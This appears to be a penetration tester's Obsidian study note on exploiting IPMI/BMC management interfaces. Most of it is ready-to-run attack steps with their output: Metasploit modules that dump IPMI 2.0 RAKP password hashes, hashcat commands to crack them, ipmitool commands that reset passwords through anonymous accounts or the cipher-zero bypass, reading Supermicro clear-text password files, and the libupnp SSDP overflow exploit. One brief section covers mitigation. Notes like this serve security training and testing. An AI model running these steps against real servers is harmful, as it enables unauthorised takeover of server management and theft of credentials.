---
id: Exploitation
aliases: []
tags:
  - Networking/Services/IPMI/Exploitation
---

# Exploitation

___

<!-- Default Credentials {{{-->
## Default Credentials

It may be possible to log in using the
[[General#Dangerous Settings|default passwords]]

___

<!-- }}} -->

<!-- Hash Cracking {{{-->
## Hash Cracking

The server sends a salted hash of the user's password to the client
before authentication takes place

> [!info]-
>
> During the authentication process, IPMI 2.0 mandates that the server send
> a salted
> [SHA1](https://en.wikipedia.org/wiki/SHA-1) or
> or
> [MD5](https://en.wikipedia.org/wiki/MD5)
> hash of the requested user password to the client


IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
([ipmi_dumphashes](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/))

```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
```

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Select Exploit|Select scanner]]
>
> ```sh
> msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
> ```
>
> 2. [[Metasploit#Set Options|Select options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
> ```
>
> 3. [[Metasploit#Show Options|Show options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
> ```
>
> ```sh
> Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
>
>    Name                 Current Setting                                                    Required  Description
>    ----                 ---------------                                                    --------  -----------
>    CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
>    OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
>    OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
>    PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
>    RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
>    RPORT                623                                                                yes       The target port
>    THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
>    USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
> ```
>
> 4. [[Metasploit#Run Exploit|Run the scan]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
> ```
> ```sh
> [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
> [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
> [*] Scanned 1 of 1 hosts (100% complete)
> [*] Auxiliary module execution completed
>
> This flaw is a critical component of the [[General|IPMI]] specification
> ```
<!-- }}} -->

> [!tip]- Hash Cracking
>
> Crack [[Enumeration#Dump Hashes|dumped password hashes]] with [[Hashcat]]
>
> ```sh
> hashcat -m 300 <ipmi_hash.txt> <rockyou.txt>
> ```
>
> HP iLO [[General#Dangerous Settings|default password]] crack with [[Hashcat]]
>
> ```sh
> hashcat -m 7300 <ipmi_hash.txt> -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
> ```


> [!Tip]- Mitigation
>
> There is no direct "fix" to this issue because the flaw is a critical component
> of the [[General|IPMI]] specification
>
> Clients can opt for
> - a very long, difficult to crack passwords
> - implement network segmentation rules
>   to restrict the direct access to the [[General#BMC|BMC]]s

<!-- Tip {{{-->
> [!tip]
>
> It should be possible to
> - [[Networking/Services/SSH/General|SSH]] into the many critical servers
>   as the `root` user
> - And gain access to the web management consoles for various network
>   monitoring tools
<!-- }}} -->

___

<!-- }}} -->

<!-- Anonymous Authentication {{{-->
## Anonymous Authentication

Reset the password of anonymous accounts

> [!example]-
>
> 1. List anonymous user accounts with
>    [ipmitool](https://github.com/ipmitool/ipmitool)
>
> ```sh
> ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
> ```
> ```sh
> ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
> 1                    false  false      true      ADMINISTRATOR
> 2  root            false  false      true      ADMINISTRATOR
> 3  admin            true    true      true      ADMINISTRATOR
> ```
>
> 2. Reset the password of an account
>
> ```sh
> ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 password
> ```
>
> 3. Login to the BMC over SSH using the new password for the `root` user account
>
> ```sh
> $ ssh root@10.0.0.97
> root@10.0.0.97's password: password
> >> SMASH-CLP Console v1.09 <<
> ```

___

<!-- }}} -->

<!-- Authentication Bypass {{{-->
## Authentication Bypass

IPMI 2.0 Cipher Zero Authentication Bypass Scanner
([ipmi_cipher_zero](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_cipher_zero/))

<!-- Example {{{-->
> [!example]-
>
> Identifies IPMI 2.0-compatible systems that are vulnerable
> to an authentication bypass vulnerability through the use of cipher zero
>
> ```sh
> msf > use auxiliary/scanner/ipmi/ipmi_cipher_zero
> msf auxiliary(ipmi_cipher_zero) > show actions
>     ...actions...
> msf auxiliary(ipmi_cipher_zero) > set ACTION < action-name >
> msf auxiliary(ipmi_cipher_zero) > show options
>     ...show and set options...
> msf auxiliary(ipmi_cipher_zero) > run
> ```
<!-- }}} -->

List and change user passwords with
[ipmitool](https://github.com/ipmitool/ipmitool)

> [!example]-
>
> List users
>
> ```sh
> ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list
> ```
>
> Change password
>
> ```sh
> ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123
> ```

___

<!-- }}} -->

<!-- Supermicro {{{-->
## Supermicro

<!-- Clear-text Passwords {{{-->
### Clear-text Passwords

Supermicro stores clear-text passwords

- `/nv/PSBlock`
- `/nv/PSStore`

> [!example]-
>
> ```sh
> cat /nv/PSBlock
> ```
> ```sh
>   admin                      ADMINpassword^TT                    rootOtherPassword!
> ```

<!-- }}} -->

<!-- UPnP Vulnerability {{{-->
### UPnP Vulnerability

Supermicro includes a vulneraple UPnP SSDP listener on UDP port `1900`

Portable UPnP SDK unique_service_name() Remote Code Execution
([libupnp_ssdp_overflow](https://www.rapid7.com/db/modules/exploit/multi/upnp/libupnp_ssdp_overflow/))

```sh
use exploit/multi/upnp/libupnp_ssdp_overflow
```

> [!example]-
>
> Exploits a buffer overflow in the unique_service_name()
> function of libupnp's SSDP processor.
> The libupnp library is used across thousands of devices
> and is referred to as the Intel SDK for UPnP Devices
> or the Portable SDK for UPnP Devices.
>
> ```sh
> msf > use exploit/multi/upnp/libupnp_ssdp_overflow
> msf exploit(libupnp_ssdp_overflow) > show targets
>     ...targets...
> msf exploit(libupnp_ssdp_overflow) > set TARGET < target-id >
> msf exploit(libupnp_ssdp_overflow) > show options
>     ...show and set options...
> msf exploit(libupnp_ssdp_overflow) > exploit
> ```

<!-- }}} -->

___

<!-- }}} -->
